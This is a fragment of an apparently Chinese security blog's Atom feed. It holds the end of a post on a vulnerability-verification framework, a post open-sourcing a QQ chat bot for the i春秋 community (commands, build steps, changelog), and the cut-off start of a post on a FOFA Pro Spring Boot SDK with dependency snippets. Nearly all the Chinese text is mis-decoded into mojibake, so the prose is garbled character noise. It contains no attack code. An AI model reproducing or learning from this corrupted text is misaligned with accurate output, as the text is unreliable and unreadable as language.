href="https://github.com/0nise/scripts/tree/master/%E4%B8%80%E6%AC%BE%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%A1%86%E6%9E%B6%E7%9A%84%E6%9E%84%E6%80%9D" target="_blank" rel="noopener">https://github.com/0nise/scripts</a></p><p>æœ¬æ–‡æè¿°çš„ä¸ºæˆ‘æ‰€æ„æ€çš„ä¸€æ¬¾æ¼æ´æ¢æµ‹æ¡†æ¶ï¼Œå¦‚æœæœ‰æ–‡ç« å†…æè¿°ä¸ç¬¦ä»¥åŠé—®é¢˜ï¼Œè¯·å„ä½å¸ˆå‚…ä¸è¦åå•¬ï¼Œçƒ¦è¯·å„ä½å¸ˆå‚…æ–§æ­£ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡ç« ä¸»è¦è®²è§£ä¸€æ¬¾æ¼æ´éªŒè¯æ¡†æ¶çš„æ„æ€ï¼Œå¹¶æœªè¯¦è§£å†…éƒ¨çš„å®ç°ç»†èŠ‚ï¼Œæœ¬æ–‡ç¯‡å¹…ç¨é•¿ï¼Œè¯·è€å¿ƒçœ‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;éœ€æ±‚&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="æ‰«æå™¨" scheme="http://www.r4v3zn.com/categories/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
    
      <category term="æ‰«æå™¨" scheme="http://www.r4v3zn.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
      <category term="æ¼æ´" scheme="http://www.r4v3zn.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="æ¡†æ¶" scheme="http://www.r4v3zn.com/tags/%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººå¼€æº</title>
    <link href="http://www.r4v3zn.com/posts/db85e47b/"/>
    <id>http://www.r4v3zn.com/posts/db85e47b/</id>
    <published>2019-06-20T03:53:33.000Z</published>
    <updated>2020-11-11T08:06:56.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¼€æºåœ°å€"><a href="#å¼€æºåœ°å€" class="headerlink" title="å¼€æºåœ°å€"></a>å¼€æºåœ°å€</h2><p><a href="https://github.com/0nise/ichunqiu_qqbot" target="_blank" rel="noopener">https://github.com/0nise/ichunqiu_qqbot</a></p><blockquote><p>iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººè‡ª<code>2018å¹´02æœˆ04æ—¥</code>å¼€å§‹æœåŠ¡äºiæ˜¥ç§‹ç¤¾åŒºï¼Œæ¯æ—¥æ–‡ç« æ¨é€ã€æ–‡ç« æŸ¥è¯¢ã€é­”æ³•å¸æŸ¥è¯¢ã€ä½œè€…ä¿¡æ¯æŸ¥è¯¢ã€ä½œå®¶å›¢å¥–é‡‘ä½™é¢æŸ¥è¯¢ã€å¥–é‡‘æ’è¡Œæ¦œã€iæ˜¥ç§‹è¯¾ç¨‹æŸ¥è¯¢ç­‰ä¸€åˆ—åŠŸèƒ½ã€‚æ®ä¸å®Œå…¨ç»Ÿè®¡ï¼Œä½¿ç”¨äººæ•°å·²ç»è¶…è¿‡<code>3.5ä¸‡</code>ï¼Œä½¿ç”¨æ¬¡æ•°è¾¾åˆ°<code>20ä¸‡</code>ï¼Œæœ€å¤§è¦†ç›–<code>700+</code>ä¸ªç¾¤ã€‚</p></blockquote><blockquote><p>è‡ª<code>2019å¹´6æœˆ13æ—¥</code>èµ·iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººä¸iæ˜¥ç§‹ç¤¾åŒºç›¸å…³çš„åŠŸèƒ½å…¨éƒ¨å…³é—­ï¼Œiæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººå®£å¸ƒæ­£å¼å¼€æºï¼Œéå¸¸æ„Ÿè°¢å¯¹iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººçš„æ”¯æŒã€‚åŒæ—¶iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººæ­£å¼æ›´åä¸º<code>Alphaæœºå™¨äºº</code>ï¼Œå¯¹äºæ–°çš„æœºå™¨äººæ­£åœ¨æ„æ€ä¸­ï¼Œæœ‰æƒ³æ³•ã€å»ºè®®çš„å¯ä»¥æäº¤åˆ°<a href="https://github.com/0nise/ichunqiu_qqbot/issues" target="_blank" rel="noopener">Issues</a>ä¸­ï¼Œéå¸¸æ„Ÿè°¢ã€‚</p></blockquote><ul><li><p>éå¸¸æ„Ÿè°¢æœŸé—´çš„è¿ç»´<a href="https://github.com/NS-Sp4ce" target="_blank" rel="noopener">NS-Sp4ce</a>ã€‚</p></li><li><p>éå¸¸æ„Ÿè°¢æå‡ºå„ç§éœ€æ±‚åè›‹ã€‚</p></li><li><p>éå¸¸æ„Ÿè°¢ç‹å…«è›‹<a href="https://github.com/newbe36524/" target="_blank" rel="noopener">newbe36524</a>çš„<a href="https://github.com/newbe36524/Newbe.Mahua.Framework" target="_blank" rel="noopener">Newbe.Mahua.Framework</a>æ¡†æ¶çš„æ”¯æŒã€‚</p></li><li><p>éå¸¸æ„Ÿè°¢<a href="https://github.com/CoolQ" target="_blank" rel="noopener">CoolQ</a>çš„æ”¯æŒã€‚</p></li><li><p>éå¸¸æ„Ÿè°¢æäº¤ç¬¬ä¸€ä¸ªæ¼æ´çš„<a href="https://github.com/gh0stkey" target="_blank" rel="noopener">gh0stkey</a>ã€‚</p></li><li><p>â€¦â€¦</p></li></ul><h2 id="åŠŸèƒ½æŒ‡ä»¤"><a href="#åŠŸèƒ½æŒ‡ä»¤" class="headerlink" title="åŠŸèƒ½æŒ‡ä»¤"></a>åŠŸèƒ½æŒ‡ä»¤</h2><h3 id="æ–‡ç« ç›¸å…³"><a href="#æ–‡ç« ç›¸å…³" class="headerlink" title="æ–‡ç« ç›¸å…³"></a>æ–‡ç« ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">éšæœºæ–‡ç«  --&gt; éšæœºå›å¤æ–‡ç« </span><br><span class="line">æœ€æ–°æ–‡ç«  --&gt; å›å¤æœ€æ–°æ–‡ç« </span><br><span class="line">ä½œè€…éšæœº --&gt; æŒ‡å®šä½œè€…éšæœºå›å¤æ–‡ç« </span><br><span class="line">ä½œè€…æœ€æ–° --&gt; å›å¤ä½œè€…æœ€æ–°æ–‡ç« </span><br></pre></td></tr></table></figure><h3 id="è¯¾ç¨‹ç›¸å…³"><a href="#è¯¾ç¨‹ç›¸å…³" class="headerlink" title="è¯¾ç¨‹ç›¸å…³"></a>è¯¾ç¨‹ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">éšæœºæ•™ç¨‹ --&gt; iæ˜¥ç§‹é¦–é¡µéšæœºè¯¾ç¨‹</span><br><span class="line">æœ€æ–°æ•™ç¨‹ --&gt; iæ˜¥ç§‹é¦–é¡µæœ€æ–°è¯¾ç¨‹</span><br><span class="line">ä»Šæ—¥æœ€æ–° --&gt; iæ˜¥ç§‹é¦–é¡µè¯¾ç¨‹1æ¡å’Œ4æ¡æœ€æ–°æ–‡ç« </span><br></pre></td></tr></table></figure><h3 id="ç¾¤æ¨é€ç›¸å…³"><a href="#ç¾¤æ¨é€ç›¸å…³" class="headerlink" title="ç¾¤æ¨é€ç›¸å…³"></a>ç¾¤æ¨é€ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å‘å¸ƒ --&gt; å‘å¸ƒæ¨é€ä¿¡æ¯ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="line">è‰¾ç‰¹å…¨ä½“ --&gt; å‘å¸ƒæ¨é€ä¿¡æ¯ï¼ˆè‰¾ç‰¹å…¨ä½“æ¨é€ï¼‰ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br></pre></td></tr></table></figure><h3 id="iæ˜¥ç§‹ä½œå®¶å›¢ç›¸å…³"><a href="#iæ˜¥ç§‹ä½œå®¶å›¢ç›¸å…³" class="headerlink" title="iæ˜¥ç§‹ä½œå®¶å›¢ç›¸å…³"></a>iæ˜¥ç§‹ä½œå®¶å›¢ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥è¯¢ä½™é¢ --&gt; æŸ¥è¯¢iæ˜¥ç§‹ä½œå®¶å›¢ä½™é¢ï¼ˆè‡ªå·±ï¼‰</span><br><span class="line">æç°è®°å½• --&gt; iæ˜¥ç§‹ä½œå®¶å›¢æˆå‘˜æç°è®°å½•</span><br><span class="line">è´¢å¯Œæ¦œ --&gt; iæ˜¥ç§‹ä½œå®¶å›¢å¥–é‡‘æ’è¡Œ</span><br><span class="line">æˆ‘çš„ä¿¡æ¯ --&gt; iæ˜¥ç§‹ä½œå®¶å›¢ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">åŠ é’± --&gt; iæ˜¥ç§‹ä½œå®¶å›¢æŒ‡å®šç”¨æˆ·æ·»åŠ å¥–é‡‘ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="line">æç° --&gt; iæ˜¥ç§‹ä½œå®¶å›¢å‘èµ·ä½“ç°</span><br></pre></td></tr></table></figure><h3 id="ç»Ÿè®¡ç›¸å…³"><a href="#ç»Ÿè®¡ç›¸å…³" class="headerlink" title="ç»Ÿè®¡ç›¸å…³"></a>ç»Ÿè®¡ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä»Šæ—¥ä½¿ç”¨ --&gt; ä»Šæ—¥ä½¿ç”¨æœºå™¨äººæ¬¡æ•°ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="line">æ€»äººæ•° --&gt; ä½¿ç”¨æœºå™¨äººæ¬¡æ•°ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="line">7æ—¥ä½¿ç”¨ --&gt; ä¸€å‘¨å†…ä½¿ç”¨æœºå™¨äººæƒ…å†µï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="line">ç¾¤æ•° --&gt; æœºå™¨äººè¦†ç›–ç¾¤æ•°é‡ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</span><br></pre></td></tr></table></figure><h3 id="å¸®åŠ©ç›¸å…³"><a href="#å¸®åŠ©ç›¸å…³" class="headerlink" title="å¸®åŠ©ç›¸å…³"></a>å¸®åŠ©ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">help --&gt; æŒ‡ä»¤ä¿¡æ¯</span><br><span class="line">æŒ‡ä»¤ --&gt; æŒ‡ä»¤ä¿¡æ¯</span><br><span class="line">å…³äºæˆ‘ --&gt; å…³äºæˆ‘</span><br></pre></td></tr></table></figure><h2 id="å¼€å‘ç¯å¢ƒ"><a href="#å¼€å‘ç¯å¢ƒ" class="headerlink" title="å¼€å‘ç¯å¢ƒ"></a>å¼€å‘ç¯å¢ƒ</h2><p>æ“ä½œç³»ç»Ÿï¼šWindows 10</p><p>å¼€å‘è¯­è¨€ï¼šCSharp</p><p>æ•°æ®åº“ï¼šMySQL5.7</p><p>è¿è¡Œå¹³å°ï¼š<a href="https://cqp.cc/t/14901" target="_blank" rel="noopener">é…·Q Pro</a></p><p>å¼€å‘å·¥å…·ï¼šVisual Studio 2019</p><p>.NETç‰ˆæœ¬ï¼š4.5.2</p><p>å¼€å‘æ¡†æ¶ï¼šåŸºäºç‹å…«è›‹<a href="https://github.com/newbe36524/" target="_blank" rel="noopener">newbe36524</a>çš„<a href="https://github.com/newbe36524/Newbe.Mahua.Framework" target="_blank" rel="noopener">Newbe.Mahua.Framework</a>æ¡†æ¶å¼€å‘</p><p>Newbe.Mahua.Frameworkï¼š<a href="https://github.com/newbe36524/Newbe.Mahua.Framework" target="_blank" rel="noopener">https://github.com/newbe36524/Newbe.Mahua.Framework</a></p><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><p>è¿è¡Œ<code>Newbe.Mahua.Plugins.iChunqiuQQBot/Newbe.Mahua.Plugins.iChunqiuQQBoot.Beta</code>ç›®å½•ä¸­çš„<code>build.bat</code>æ–‡ä»¶è¿›è¡Œç¼–è¯‘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build.bat</span><br></pre></td></tr></table></figure></p><h3 id="CoolQè¿è¡Œ"><a href="#CoolQè¿è¡Œ" class="headerlink" title="CoolQè¿è¡Œ"></a>CoolQè¿è¡Œ</h3><p>åœ¨<code>Newbe.Mahua.Plugins.iChunqiuQQBot/Newbe.Mahua.Plugins.iChunqiuQQBoot.Beta/bin</code>ç›®å½•ä¸‹ä¼šæŒ‰ç…§å½“å‰å®‰è£…çš„å¹³å°ç”Ÿæˆç›¸åº”çš„ç›®å½•ã€‚æœ¬ç¤ºä¾‹å°†ä¼šç”Ÿæˆ CQPã€Amanda å’Œ MPQ ä¸‰ä¸ªç›®å½•ã€‚</p><p>åˆ†åˆ«å°†ä¸‰ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹éƒ½å¤åˆ¶åˆ°å¯¹åº”çš„æœºå™¨äººå¹³å°æ ¹ç›®å½•ã€‚</p><p>ä»¥ CQP ä¸ºä¾‹ï¼Œè¿›è¡Œä¸€æ¬¡å¤åˆ¶è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://img.zhiiyun.com/20180916-001.gif" alt="CQPå¤åˆ¶æ’ä»¶"></p><p>å„æœºå™¨äººè½¯ä»¶ä¸‹è½½åœ°å€ï¼š</p><table><thead><tr><th style="text-align:center">åç§°</th><th style="text-align:center">åœ°å€</th></tr></thead><tbody><tr><td style="text-align:center">CQP</td><td style="text-align:center"><a href="https://cqp.cc/" target="_blank" rel="noopener">https://cqp.cc/</a></td></tr><tr><td style="text-align:center">MPQ</td><td style="text-align:center"><a href="https://f.mypcqq.cc/thread-2327-1-1.html" target="_blank" rel="noopener">https://f.mypcqq.cc/thread-2327-1-1.html</a></td></tr><tr><td style="text-align:center">CleverQQ</td><td style="text-align:center"><a href="https://d.cleverqq.cn/forum.php" target="_blank" rel="noopener">https://d.cleverqq.cn/forum.php</a></td></tr><tr><td style="text-align:center">QQLight</td><td style="text-align:center"><a href="http://www.52chat.cc/" target="_blank" rel="noopener">http://www.52chat.cc/</a></td></tr></tbody></table><h3 id="å¯ç”¨æ’ä»¶"><a href="#å¯ç”¨æ’ä»¶" class="headerlink" title="å¯ç”¨æ’ä»¶"></a>å¯ç”¨æ’ä»¶</h3><p>å„ä¸ªæœºå™¨äººå¹³å°çš„å¯ç”¨æ–¹å¼å„ä¸ç›¸åŒã€‚</p><h4 id="CQP"><a href="#CQP" class="headerlink" title="CQP"></a>CQP</h4><p>æŒ‰ç…§ä¸‹å›¾æ‰€ç¤ºï¼Œå¼€å¯å¼€å‘è€…æ¨¡å¼ã€‚</p><p><img src="https://img.zhiiyun.com/20171218-001.jpg" alt="å¼€å¯å¼€å‘è€…æ¨¡å¼"></p><p>æ‰“å¼€æ’ä»¶ç®¡ç†å°†æ’ä»¶å¯ç”¨ã€‚</p><h4 id="CleverQQ"><a href="#CleverQQ" class="headerlink" title="CleverQQ"></a>CleverQQ</h4><p>æ‰“å¼€æ’ä»¶ç®¡ç†å°†æ’ä»¶å¯ç”¨ã€‚</p><h4 id="MPQ"><a href="#MPQ" class="headerlink" title="MPQ"></a>MPQ</h4><p>æ‰“å¼€æ’ä»¶ç®¡ç†å°†æ’ä»¶å¯ç”¨ã€‚</p><h4 id="QQLight"><a href="#QQLight" class="headerlink" title="QQLight"></a>QQLight</h4><p>æ‰“å¼€æ’ä»¶ç®¡ç†å°†æ’ä»¶å¯ç”¨ã€‚</p><h3 id="æˆåŠŸï¼"><a href="#æˆåŠŸï¼" class="headerlink" title="æˆåŠŸï¼"></a>æˆåŠŸï¼</h3><p>å‘é€æ¶ˆæ¯ç»™æœºå™¨äººï¼Œä½ å°±ä¼šæ”¶åˆ°æœºå™¨äººå›å‘çš„ä¿¡æ¯ã€‚</p><p><img src="https://img.zhiiyun.com/about_me.png" alt=""></p><blockquote><p>æœºå™¨äººæ’ä»¶å¯åŠ¨å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´ï¼Œå¹¶ä¸”å¤§å¤šæ•°å¹³å°éƒ½ä¼šä¸¢å¼ƒç¦»çº¿ä¿¡æ¯ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…ä¸€ä¼šå„¿åœ¨å‘é€ã€‚</p></blockquote><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p><a href="http://www.newbe.pro/2019/05/05/Newbe.Mahua/Newbe-Mahua-CQP-Hotfix/" target="_blank" rel="noopener">Newbe.Mahua CQP ç´§æ€¥æ•…éšœä¿®å¤</a></p><h2 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h2><h3 id="æœ€æ–°æ–‡ç« æŒ‡ä»¤"><a href="#æœ€æ–°æ–‡ç« æŒ‡ä»¤" class="headerlink" title="æœ€æ–°æ–‡ç« æŒ‡ä»¤"></a>æœ€æ–°æ–‡ç« æŒ‡ä»¤</h3><p><img src="https://img.zhiiyun.com/images.png" alt=""></p><h3 id="å…³äºæˆ‘æŒ‡ä»¤"><a href="#å…³äºæˆ‘æŒ‡ä»¤" class="headerlink" title="å…³äºæˆ‘æŒ‡ä»¤"></a>å…³äºæˆ‘æŒ‡ä»¤</h3><p><img src="https://img.zhiiyun.com/about_me.png" alt=""></p><h3 id="ç¾¤æ•°é‡æŒ‡ä»¤"><a href="#ç¾¤æ•°é‡æŒ‡ä»¤" class="headerlink" title="ç¾¤æ•°é‡æŒ‡ä»¤"></a>ç¾¤æ•°é‡æŒ‡ä»¤</h3><p><img src="https://img.zhiiyun.com/qum_count.png" alt=""></p><h2 id="æ–‡ä»¶ç®€ä»‹"><a href="#æ–‡ä»¶ç®€ä»‹" class="headerlink" title="æ–‡ä»¶ç®€ä»‹"></a>æ–‡ä»¶ç®€ä»‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€images å›¾ç‰‡èµ„æº</span><br><span class="line">â”œâ”€Newbe.Mahua.Plugins.iChunqiuQQBot iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººæºä»£ç </span><br><span class="line">â”œâ”€script iæ˜¥ç§‹çˆ¬è™«è„šæœ¬</span><br><span class="line">â”‚  â”œâ”€spider_ichunqiu.py çˆ¬è™«iæ˜¥ç§‹å…¨éƒ¨ç¤¾åŒºæ–‡ç« </span><br><span class="line">â”‚  â”œâ”€spider_ichunqiu_class.py çˆ¬è™«iæ˜¥ç§‹è¯¾ç¨‹ä¿¡æ¯</span><br><span class="line">â”‚  â”œâ”€spider_ichunqiu_ext.py å®šæ—¶çˆ¬è™«iæ˜¥ç§‹ç¤¾åŒºæ–‡ç« ï¼Œåªçˆ¬è™«æ¯ä¸ªæ¿å—çš„ç¬¬ä¸€é¡µ</span><br><span class="line">â”‚  â”œâ”€ThreadPool.py çº¿ç¨‹æ± </span><br><span class="line">â”‚  â””â”€update_content.py å®šæ—¶æ›´æ–°æ•°æ®æ•°æ®åº“ä¸è®ºå›å†…å®¹ä¿æŒåŒæ­¥</span><br><span class="line">â””â”€sql iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººæ•°æ®åº“è®¾è®¡ç»“æ„</span><br></pre></td></tr></table></figure><h2 id="ç¨‹åºæ›´æ–°æ—¥å¿—"><a href="#ç¨‹åºæ›´æ–°æ—¥å¿—" class="headerlink" title="ç¨‹åºæ›´æ–°æ—¥å¿—"></a>ç¨‹åºæ›´æ–°æ—¥å¿—</h2><p>2019.06.19</p><ul><li>iæ˜¥ç§‹ç¤¾åŒºæœºå™¨äººæ­£å¼å¼€æº</li></ul><p>â€¦â€¦ </p><ul><li>æˆ‘ä¹Ÿå¿˜äº†æˆ‘æ”¹äº†å¤šå°‘æ¬¡äº†</li></ul><p>2018.5.21</p><ul><li>ä¿®æ”¹ä¸€äº›ç»†å¾®çš„BUG</li></ul><p>2018.3.13</p><ul><li>æ·»åŠ å®šæ—¶çˆ¬è™«iæ˜¥ç§‹ç¤¾åŒºæ–‡ç« ä¿¡æ¯</li></ul><p>2018.3.9</p><ul><li>æ›´æ–°çˆ¬è™«ç¤¾åŒºç±»åˆ«ä»¥åŠå­ç±»ä¿¡æ¯</li></ul><p>2018.3.1</p><ul><li>æ·»åŠ çˆ¬è™«ï½‰æ˜¥ç§‹è¯¾ç¨‹çš„è„šæœ¬</li></ul><p>2018.2.4</p><ul><li>ä¿®å¤æœºå™¨äººï¼³ï¼±ï¼¬æ³¨å…¥æ¼æ´</li></ul><h2 id="ç›¸å…³æ–‡ç« "><a href="#ç›¸å…³æ–‡ç« " class="headerlink" title="ç›¸å…³æ–‡ç« "></a>ç›¸å…³æ–‡ç« </h2><p><a href="https://bbs.ichunqiu.com/thread-34956-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-34956-1-1.html</a></p><p><a href="https://bbs.ichunqiu.com/thread-33770-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-33770-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å¼€æºåœ°å€&quot;&gt;&lt;a href=&quot;#å¼€æºåœ°å€&quot; class=&quot;headerlink&quot; title=&quot;å¼€æºåœ°å€&quot;&gt;&lt;/a&gt;å¼€æºåœ°å€&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0nise/ichunqiu_qqbot&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="æœºå™¨äºº" scheme="http://www.r4v3zn.com/categories/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
    
      <category term="iæ˜¥ç§‹" scheme="http://www.r4v3zn.com/tags/i%E6%98%A5%E7%A7%8B/"/>
    
      <category term="æœºå™¨äºº" scheme="http://www.r4v3zn.com/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
      <category term="C sharp" scheme="http://www.r4v3zn.com/tags/C-sharp/"/>
    
  </entry>
  
  <entry>
    <title>FOFA Pro SpringBoot2 SDK</title>
    <link href="http://www.r4v3zn.com/posts/e0ad5c1b/"/>
    <id>http://www.r4v3zn.com/posts/e0ad5c1b/</id>
    <published>2019-06-17T08:17:39.000Z</published>
    <updated>2020-11-11T08:06:56.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¼€æºåœ°å€"><a href="#å¼€æºåœ°å€" class="headerlink" title="å¼€æºåœ°å€"></a>å¼€æºåœ°å€</h2><p><a href="https://github.com/fofapro/fofa-spring-boot-starter" target="_blank" rel="noopener">https://github.com/fofapro/fofa-spring-boot-starter</a></p><h2 id="FOFA-Pro-API"><a href="#FOFA-Pro-API" class="headerlink" title="FOFA Pro API"></a>FOFA Pro API</h2><p><a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> æ˜¯èµ„äº§æœç´¢å¼•æ“ <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> ä¸ºå¼€å‘è€…æä¾›çš„ <code>RESTful API</code> æ¥å£, å…è®¸å¼€å‘è€…åœ¨è‡ªå·±çš„é¡¹ç›®ä¸­é›†æˆ <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> çš„åŠŸèƒ½ã€‚</p><h2 id="FOFA-SDK"><a href="#FOFA-SDK" class="headerlink" title="FOFA SDK"></a>FOFA SDK</h2><p>åŸºäº <a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> ç¼–å†™çš„ <code>Spring Boot</code> ç‰ˆ <code>SDK</code>, æ–¹ä¾¿ java å¼€å‘è€…å¿«é€Ÿå°† <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> é›†æˆåˆ°è‡ªå·±çš„é¡¹ç›®ä¸­ã€‚</p><h2 id="æ·»åŠ ä¾èµ–"><a href="#æ·»åŠ ä¾èµ–" class="headerlink" title="æ·»åŠ ä¾èµ–"></a>æ·»åŠ ä¾èµ–</h2><h3 id="Apache-Maven"><a href="#Apache-Maven" class="headerlink" title="Apache Maven"></a>Apache Maven</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.r4v3zn.fofa&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;fofa-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="Gradle-Groovy-DSL"><a href="#Gradle-Groovy-DSL" class="headerlink" title="Gradle Groovy DSL"></a>Gradle Groovy DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">'com.r4v3zn.fofa:fofa-spring-boot-starter:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Gradle-Kotlin-DSL"><a href="#Gradle-Kotlin-DSL" class="headerlink" title="Gradle Kotlin DSL"></a>Gradle Kotlin DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(<span class="string">"com.r4v3zn.fofa:fofa-spring-boot-starter:1.0.0"</span>)</span><br></pre></td></tr></table></figure><h3 id="Scala-SBT"><a href="#Scala-SBT" class="headerlink" title="Scala SBT"></a>Scala SBT</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libraryDependencies += <span class="string">"com.r4v3zn.fofa"</span> % <span class="string">"fofa-spring-boot-starter"</span> % <span class="string">"1.0.0"</span></span><br></pre></td></tr></table></figure><h3 id="Apache-Ivy"><a href="#Apache-Ivy" class="headerlink" title="Apache Ivy"></a>Apache Ivy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency org=<span class="string">"com.r4v3zn.fofa"</span> name=<span class="string">"fofa-spring-boot-starter"</span> rev=<span class="string">"1.0.0"</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="Groovy-Grape"><a href="#Groovy-Grape" class="headerlink" title="Groovy Grape"></a>Groovy Grape</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Grapes</span>(</span><br><span class="line">  <span class="meta">@Grab</span>(group=<span class="string">'com.r4v3zn.fofa'</span>, <span class="keyword">module</span>=<span class="string">'fofa-spring-boot-starter'</span>, version=<span class="string">'1.0.0'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Leiningen"><a href="#Leiningen" class="headerlink" title="Leiningen"></a>Leiningen</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[com.r4v3zn.fofa/fofa-spring-boot-starter <span class="string">"1.0.0"</span>]</span><br></pre></td></tr></table></figure><h3 id="Apache-Buildr"><a href="#Apache-Buildr" class="headerlink" title="Apache Buildr"></a>Apache Buildr</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'com.r4v3zn.fofa:fofa-spring-boot-starter:jar:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Maven-Central-Badge"><a href="#Maven-Central-Badge" class="headerlink" title="Maven Central Badge"></a>Maven Central Badge</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[![Maven Central](https:<span 